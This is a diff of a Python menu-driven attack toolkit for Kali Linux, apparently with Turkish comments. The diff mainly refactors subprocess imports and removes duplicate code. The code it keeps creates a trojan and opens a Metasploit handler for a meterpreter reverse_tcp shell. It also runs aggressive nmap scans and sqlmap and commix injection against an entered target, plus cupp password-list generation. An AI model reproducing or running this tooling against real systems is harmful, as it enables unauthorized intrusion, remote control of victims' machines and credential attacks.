@@ -2,18 +2,15 @@
 # Creator : No_Name.exe
 # Zusy
 
-from subprocess import run, PIPE
+import subprocess
 import os
-from difflib import get_close_matches
 
 def clear_screen():
     os.system('clear')
-from subprocess import run, PIPE
-import os
 
 def get_kali_ip():
     # Kali Linux'un IP adresini almak için ifconfig komutunu kullanın
-    process = run("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1", shell=True, stdout=PIPE, text=True)
+    process = subprocess.run("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1", shell=True, stdout=subprocess.PIPE, text=True)
     if process.returncode == 0:
         return process.stdout.strip()
     else:
@@ -61,24 +58,17 @@ def create_trojan():
     
     print("Please wait...")
                     
-    process = run(trojan_command, shell=True)
+    process = subprocess.run(trojan_command, shell=True)
     if process.returncode == 0:
         print(f"Trojan created! File directory => {os.getcwd()}/{filedirectory}.{file_extension}")
         print("Starting Metasploit...")
         msf_command = f"use exploit/multi/handler; set payload {platform}/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4242; exploit"
-        run(f"msfconsole -q -x '{msf_command}'", shell=True)
+        subprocess.run(f"msfconsole -q -x '{msf_command}'", shell=True)
     else:
         print("Trojan creation failed.")
         
     input("\nPress Enter to continue...")
     main_menu()
-
-
-import subprocess
-
-def clear_screen():
-    # Ekranı temizlemek için uygun bir komut kullanın
-    subprocess.run("clear", shell=True)
 
 def ip_tracer():
     clear_screen()
@@ -103,8 +93,6 @@ def ip_tracer():
     input("\nPress Enter to go back...")
     main_menu()
 
-
-
 def nmap_scan():
     clear_screen()
     print("[0] Back\n")
@@ -114,39 +102,39 @@ def nmap_scan():
         return
     nmap_command = f"nmap -p1-65535 -sV -sS -T4 -A -O {target_ip}"
     print("Please Wait")
-    process = run(nmap_command, shell=True)
+    process = subprocess.run(nmap_command, shell=True)
     if process.stdout is not None:
         print(process.stdout.decode())
     else:
         print("Nmap scan completed.")
     input("\nPress Enter to go back...")
-    main_menu()    
-    
+    main_menu()
+
 def port_scan():
     clear_screen()
     port_scancommand = f"python3 portscan.py"
     print("Please Wait")
-    process = run(port_scancommand, shell=True)
+    process = subprocess.run(port_scancommand, shell=True)
     if process.stdout is not None:
         print(process.stdout.decode())
     else:
         print("")    
         print("Port scan completed.")
     input("\nPress Enter to go back...")
-    main_menu()     
-    
+    main_menu()
+
 def netdiscover():
     clear_screen()
     netdiscover_command = f"netdiscover"
     print("Please Wait")
-    process = run(netdiscover_command, shell=True)
+    process = subprocess.run(netdiscover_command, shell=True)
     if process.stdout is not None:
         print(process.stdout.decode())
     else:
         print("")
     input("\nPress Enter to go back...")
-    main_menu()        
-    
+    main_menu()
+
 def sql_scan():
     clear_screen()
     print("[0] Back\n")
@@ -155,14 +143,14 @@ def sql_scan():
         main_menu()
     nmap_command = f"sqlmap -u {target_ip}"
     print("Please Wait")
-    process = run(nmap_command, shell=True)
+    process = subprocess.run(nmap_command, shell=True)
     if process.stdout is not None:
         print(process.stdout.decode())
     else:
         print("Scan completed.")
     input("\nPress Enter to go back...")
-    main_menu()    
-    
+    main_menu()
+
 def commix_scan():
     clear_screen()
     print("[0] Back\n")
@@ -171,51 +159,49 @@ def commix_scan():
         main_menu()
     nmap_command = f"commix -u {target_ip}"
     print("Please Wait")
-    process = run(nmap_command, shell=True)
+    process = subprocess.run(nmap_command, shell=True)
     if process.stdout is not None:
         print(process.stdout.decode())
     else:
         print("Scan completed.")
     input("\nPress Enter to go back...")
-    main_menu()        
-
+    main_menu()
 
 def open_metasploit():
     clear_screen()
-    process = run("msfconsole -q", shell=True)
-    
+    subprocess.run("msfconsole -q", shell=True)
+
 def cupp_open():
     clear_screen()
-    process = run("which cupp", shell=True, stdout=PIPE, stderr=PIPE)
+    process = subprocess.run("which cupp", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     if process.returncode == 0:
         print("")
-        run("cupp -i", shell=True)
+        subprocess.run("cupp -i", shell=True)
     else:
         print("Cupp is not installed. Installing...")
         install_command = "sudo apt install cupp"
-        process = run(install_command, shell=True)
+        process = subprocess.run(install_command, shell=True)
         if process.returncode == 0:
             print("Cupp installed successfully. Opening...")
-            run("cupp -i", shell=True)
+            subprocess.run("cupp -i", shell=True)
         else:
             print("Failed to install Cupp.")
     input("\nPress Enter to go back...")
     main_menu()
- 
-    
+
 def update_kali():
     clear_screen()
-    process = run("sudo apt update && sudo apt upgrade", shell=True)    
-    
+    subprocess.run("sudo apt update && sudo apt upgrade", shell=True)
+
 def ifconfig():
     clear_screen()
-    process = run("ifconfig", shell=True)
+    process = subprocess.run("ifconfig", shell=True)
     if process.stdout is not None:
         print(process.stdout.decode())
     else:
         print("")
     input("\nPress Enter to go back...")
-    main_menu()    
+    main_menu()   
     
 def kali_undercover():
     clear_screen()
